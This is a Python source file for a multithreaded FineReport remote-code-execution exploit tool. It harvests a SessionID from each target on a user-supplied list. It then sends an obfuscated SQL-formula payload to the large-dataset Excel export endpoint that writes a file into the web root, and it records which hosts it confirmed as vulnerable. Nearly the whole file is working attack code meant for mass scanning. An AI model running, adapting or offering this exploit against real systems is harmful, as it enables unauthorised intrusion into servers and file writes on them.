import requests
import sys
import argparse
import threading
import time
from urllib.parse import urlparse, quote
import urllib3
import re
import os
import socket
from queue import Queue

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    """简洁版Banner"""
    banner = r"""
  ______ _           _____                       _   
 |  ____(_)         |  __ \                     | |  
 | |__   _ _ __   __| |__) |___ _ __   ___  _ __| |_ 
 |  __| | | '_ \ / _|  _  // _ \ '_ \ / _ \| '__| __|
 | |    | | | | | (_| | \ \  __/ |_) | (_) | |  | |_ 
 |_|    |_|_| |_|\__|_|  \_\___| .__/ \___/|_|   \__|
                               | |                   
                               |_|                   
╔═══════════════════════════════════════════════════════════════════╗
║                    FineReport RCE漏洞利用工具                       ║
║                  GitHub: https://github.com/Domren                ║
║                            作者: Domren                            ║
╚═══════════════════════════════════════════════════════════════════╝
"""
    print(banner)


class FineReportExploit:
    def __init__(self, timeout=5, threads=30):
        self.timeout = timeout
        self.threads = threads
        self.should_stop = False
        
        # 创建session
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=threads,
            pool_maxsize=threads,
            max_retries=0
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # 结果存储
        self.vulnerable_targets = []
        self.lock = threading.Lock()
        self.processed = 0
        self.total = 0
        self.start_time = time.time()
        
        # UUID正则
        self.uuid_pattern = re.compile(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', re.IGNORECASE)
        
    def normalize_url(self, url):
        """规范化URL"""
        url = url.strip()
        if not url:
            return None
            
        # 添加协议前缀
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        try:
            parsed = urlparse(url)
            netloc = parsed.netloc
            if not netloc:
                return None
            return f"{parsed.scheme}://{netloc}"
        except:
            return None
    
    def get_session_id(self, base_url):
        """第一步：获取SessionID"""
        try:
            url = f"{base_url.rstrip('/')}/webroot/ReportServer"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'viewlets': "[{'reportlet':'/'}]",
                'op': 'getSessionID',
                'Host': urlparse(base_url).netloc
            }
            
            resp = self.session.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            if resp.status_code == 200:
                content = resp.text.strip()
                if len(content) == 36 and self.uuid_pattern.match(content):
                    return content
            return None
            
        except Exception:
            return None
    
    def exploit_with_session(self, base_url, session_id):
        """第二步：使用SessionID进行利用"""
        try:
            # 构造payload写入123.txt文件
            payload = '''%3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27123%22%2C%22%27%22%2C%22%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%22123%22%2C%22.%22%2C%22t%22%2C%22x%22%2C%22t%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E'''
            
            url = f"{base_url.rstrip('/')}/webroot/decision/nx/report/v9/largedataset/export/excel"
            params = {
                'functionParams': '{}',
                '__parameters__': '{}'
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'sessionID': session_id,
                'params': payload,
                'Host': urlparse(base_url).netloc
            }
            
            resp = self.session.get(
                url,
                params=params,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            # 检查是否返回错误（正常会返回错误，因为我们在写入文件）
            if resp.status_code == 200:
                # 检查是否包含特定的错误信息
                if 'tableData is null' in resp.text:
                    return True
            return False
            
        except Exception:
            return False
    
    def verify_exploit(self, base_url):
        """第三步：验证漏洞是否成功"""
        try:
            url = f"{base_url.rstrip('/')}/webroot/123.txt"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Host': urlparse(base_url).netloc
            }
            
            resp = self.session.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            if resp.status_code == 200:
                content = resp.text
                if len(content) > 0:
                    # 显示更多内容：前200个字符
                    preview = content[:200]
                    # 替换控制字符，保持可读性
                    preview = preview.replace('\n', '⏎').replace('\r', '↵').replace('\t', '⇥')
                    # 确保只显示可打印字符
                    preview = ''.join(c if c.isprintable() else f'\\x{ord(c):02x}' for c in preview)
                    return True, preview
            return False, None
            
        except Exception:
            return False, None
    
    def check_target(self, target):
        """完整检查单个目标"""
        if self.should_stop:
            return None, None, None
            
        base_url = self.normalize_url(target)
        if not base_url:
            return None, None, None
        
        try:
            # 第一步：获取SessionID
            session_id = self.get_session_id(base_url)
            if not session_id:
                return None, None, None
            
            # 第二步：尝试利用
            exploit_success = self.exploit_with_session(base_url, session_id)
            if not exploit_success:
                return None, None, None
            
            # 第三步：验证文件是否写入成功
            verify_success, file_content = self.verify_exploit(base_url)
            if not verify_success:
                return None, None, None
            
            # 验证成功
            return session_id, base_url, file_content
            
        except Exception:
            return None, None, None
    
    def worker(self, target_queue, result_queue):
        """工作线程"""
        while not self.should_stop:
            try:
                target = target_queue.get(timeout=1)
                if target is None:
                    break
                
                # 检查目标
                session_id, base_url, file_content = self.check_target(target)
                
                with self.lock:
                    self.processed += 1
                
                if session_id and base_url and file_content:
                    result_queue.put((base_url, session_id, file_content))
                
                target_queue.task_done()
                
            except Exception:
                with self.lock:
                    self.processed += 1
                try:
                    target_queue.task_done()
                except:
                    pass
    
    def clear_line(self):
        """清空当前行"""
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    def print_vulnerable(self, base_url, session_id, file_content):
        """打印漏洞信息"""
        self.clear_line()
        print(f"[+] 漏洞目标: {base_url}")
        print(f"     SessionID: {session_id}")
        print(f"     验证文件内容: {file_content}")
        self.print_progress()
    
    def print_progress(self):
        """打印进度"""
        with self.lock:
            if self.total == 0:
                return
                
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                speed = self.processed / elapsed
                remaining = self.total - self.processed
                eta = remaining / speed if speed > 0 else 0
                
                progress = (self.processed / self.total) * 100
                bar_length = 40
                filled = int(bar_length * self.processed // self.total)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                sys.stdout.write(f'\r进度: |{bar}| {self.processed}/{self.total} ({progress:.1f}%) | 速度: {speed:.1f}个/秒 | ETA: {eta:.0f}秒')
                sys.stdout.flush()
    
    def run(self, targets_file, output_file="output.txt"):
        """主运行函数"""
        # 读取目标
        try:
            with open(targets_file, 'r', encoding='utf-8', errors='ignore') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"读取文件错误: {e}")
            return
        
        if not targets:
            print("目标列表为空")
            return
            
        self.total = len(targets)
        self.processed = 0
        self.vulnerable_targets = []
        self.start_time = time.time()
        
        print(f"开始检测 {self.total} 个目标...")
        print(f"线程数: {self.threads} | 超时: {self.timeout}秒")
        print("完整验证: SessionID获取 → 漏洞利用 → 文件验证")
        print("文件内容显示: 前200个字符")
        print("-" * 100)
        
        # 创建队列
        target_queue = Queue()
        result_queue = Queue()
        
        # 填充队列
        for target in targets:
            target_queue.put(target)
        
        # 启动工作线程
        workers = []
        for i in range(min(self.threads, len(targets))):
            worker = threading.Thread(
                target=self.worker,
                args=(target_queue, result_queue),
                daemon=True
            )
            worker.start()
            workers.append(worker)
        
        try:
            # 主循环
            while self.processed < self.total and not self.should_stop:
                # 处理结果
                try:
                    while True:
                        base_url, session_id, file_content = result_queue.get_nowait()
                        with self.lock:
                            self.vulnerable_targets.append((base_url, session_id, file_content))
                        self.print_vulnerable(base_url, session_id, file_content)
                except:
                    pass
                
                # 更新进度
                self.print_progress()
                
                # 短暂休眠
                time.sleep(0.05)
            
            # 等待完成
            target_queue.join()
            
        except KeyboardInterrupt:
            print("\n正在停止扫描...")
            self.should_stop = True
            time.sleep(1)
        
        # 最终进度
        self.clear_line()
        self.print_progress()
        print()
        
        # 收集剩余结果
        try:
            while True:
                base_url, session_id, file_content = result_queue.get_nowait()
                with self.lock:
                    self.vulnerable_targets.append((base_url, session_id, file_content))
        except:
            pass
        
        # 统计
        elapsed = time.time() - self.start_time
        speed = self.processed / elapsed if elapsed > 0 else 0
        
        print("-" * 100)
        print(f"扫描完成! 耗时: {elapsed:.1f}秒")
        print(f"总目标: {self.total} | 已扫描: {self.processed}")
        print(f"确认漏洞: {len(self.vulnerable_targets)} 个")
        
        if self.vulnerable_targets:
            # 保存结果
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    for base_url, session_id, file_content in self.vulnerable_targets:
                        f.write(f"URL: {base_url}\n")
                        f.write(f"SessionID: {session_id}\n")
                        f.write(f"文件内容(前200字符): {file_content}\n")
                        f.write("-" * 100 + "\n")
                print(f"结果已保存到: {output_file}")
                
                # 显示结果
                print("\n确认漏洞的目标:")
                for i, (base_url, session_id, file_content) in enumerate(self.vulnerable_targets, 1):
                    print(f"{i:3d}. {base_url}")
                    
            except Exception as e:
                print(f"保存错误: {e}")
        else:
            print("未发现可验证的漏洞")

def main():
    parser = argparse.ArgumentParser(description='FineReport RCE漏洞完整验证工具')
    parser.add_argument('-r', '--targets', required=True, help='目标文件路径')
    parser.add_argument('-o', '--output', default='output.txt', help='输出文件路径')
    parser.add_argument('-t', '--threads', type=int, default=30, help='线程数')
    parser.add_argument('-T', '--timeout', type=int, default=5, help='超时时间')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.targets):
        print(f"文件不存在: {args.targets}")
        sys.exit(1)
    
    detector = FineReportExploit(timeout=args.timeout, threads=args.threads)
    
    try:
        detector.run(args.targets, args.output)
    except KeyboardInterrupt:
        print("\n扫描已停止")
        sys.exit(0)
    except Exception as e:
        print(f"错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
